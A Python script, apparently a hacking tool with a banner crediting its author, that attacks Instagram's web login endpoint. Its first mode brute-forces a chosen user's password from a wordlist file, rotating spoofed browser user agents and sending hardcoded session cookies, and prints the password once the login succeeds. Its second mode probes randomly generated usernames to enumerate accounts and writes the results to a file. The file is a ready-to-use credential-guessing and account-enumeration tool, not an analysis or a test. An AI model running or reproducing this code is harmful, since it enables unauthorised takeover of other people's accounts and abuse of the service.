import requests
import sys
import time
import os
import random 
#os.system('clear')
v ='\033[0;35m'
W  = '\33[0m'
R  = '\33[1;31m'
G  = '\33[1;32m'
O  = '\33[1;33m'
B  = '\33[1;34m'
P  = '\33[1;35m'
C  = '\33[1;36m'
GR = '\33[1;37m'
def but():
    sara = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
        'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
        'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53',
        "Mozilla/5.0 (Android 7.0; Mobile; rv:54.0) Gecko/54.0 Firefox/54.0",
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4',
        'Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30"',
        'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
        'Mozilla/5.0 (L inux; Android 5.1.1; SM-N750K Build/LMY47X; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Puffin/6.0.8.15804AP',
        'Mozilla/5.0 (X11; U; Linux x86_64; en-IE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/5.2.6IP',
        'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3',
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; Microsoft; Lumia 950)',
        'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977',
        'Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+',
]
    url = " https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    
    user = input(G+f'Enter usename{R} : ')
    password = input(G+f'Enter Password list{R} : ')
    try:
        ss = open(password,'r')
    except:
        print('path password list Error ')
        sys.exit()
    for ii in ss.readlines():
        ii=ii.strip()
        option=random.choice(sara)
        hed={
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7',
        'content-length': '296',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'csrftoken=U0Qqe3OpXjSxOwYbgYDuyqxaLla2rlnA; mid=Y68EgQALAAH9nWo1UU9VpxESxX8i; ig_nrcb=1; ig_did=98EE58BE-0A23-4177-BCF3-9F1236AAA953; datr=dwSvYxu3sj5xHiIMGDXbIMe_',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': option,
        'viewport-width': '524',
        'x-asbd-id': '198387',
        'x-csrftoken': 'U0Qqe3OpXjSxOwYbgYDuyqxaLla2rlnA',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1006797619',
        'x-requested-with': 'XMLHttpRequest',
    }
        payload={
            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+ii,
            'username': user,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
        time.sleep(10)
        req=requests.post(url,headers=hed,data=payload)
        #print(req.text)
        mm='"authenticated":true'
        if mm in req.text :
            print('acssec granted ')
            print (G+'username: '+R+user)
            print (G+"password : "+R+ii)
            break
        m2='"user":true,"authenticated":false'
        if m2 in req.text:
            print(R+'user true password faild : '+O+ii)
        faild = '"message":"Sorry, your password was incorrect. Please double-check your password.","status":"fail"}'
        if faild in req.text:
            print(R+"username false && password false : "+O+ii)
        else:
            print(R+'Error')
def user():
    URL= " https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    password = 'hackediso'
    kay = 'azertyuiopmlkjhgfdsqwxcvbn1234567890_'
    try:
        namber=int(input(f'{R}-{G} Enter Namber User{W} : '))
        saraissam=int(input(f'{R}-{G} Enter Namber Search {W}: '))
        print(O+'Save in file > userList.txt')
    except:
        print(R+'Error')
        sys.exit()
    list = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
        'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
        'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53',
        "Mozilla/5.0 (Android 7.0; Mobile; rv:54.0) Gecko/54.0 Firefox/54.0",
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4',
        'Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30"',
        'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
        'Mozilla/5.0 (L inux; Android 5.1.1; SM-N750K Build/LMY47X; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Puffin/6.0.8.15804AP',
        'Mozilla/5.0 (X11; U; Linux x86_64; en-IE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/5.2.6IP',
        'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3',
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; Microsoft; Lumia 950)',
        'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977',
        'Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+',
]
    for i in range(saraissam):
        user = str(''.join(random.choice(kay) for i in range(namber)))
        agen=random.choice(list)
        print(agen)
        headers={
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7',
        'content-length': '296',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'csrftoken=U0Qqe3OpXjSxOwYbgYDuyqxaLla2rlnA; mid=Y68EgQALAAH9nWo1UU9VpxESxX8i; ig_nrcb=1; ig_did=98EE58BE-0A23-4177-BCF3-9F1236AAA953; datr=dwSvYxu3sj5xHiIMGDXbIMe_',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': agen,
        'viewport-width': '524',
        'x-asbd-id': '198387',
        'x-csrftoken': 'U0Qqe3OpXjSxOwYbgYDuyqxaLla2rlnA',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1006797619',
        'x-requested-with': 'XMLHttpRequest',
        }
        payload={
            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+password,
            'username': user,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
        req=requests.post(url=URL,headers=headers,data=payload)
        
        if 'user":true' in req.text:
            print(O+f'[{i}]{R} User Faund -> '+B+user)
        else:
            print(O+f'[{i}]{G} User Not faund -> {W}'+user)
            hahah = open('userList.txt','a')
            hahah.write(user+'\n')
            hahah.close()
def bnr():
    print(f'''{R}
    --------------------------------------
    |{G} coding bay : issam iso  {R}           |
    |{G} github : issamiso    {R}              |
    |{G} facebook : facebook.com/isohacking{R} |
    --------------------------------------
    ''')

def start():
    bnr()
    print (O+f'1 - {G}Guess Instagram')
    print (O+f'2 - {G}User Instagram')
    cmd = input(R+f"[-]{B} isiso {W}> ")
    if cmd == '1':
        but()
    if cmd == '2':
        user()

start()






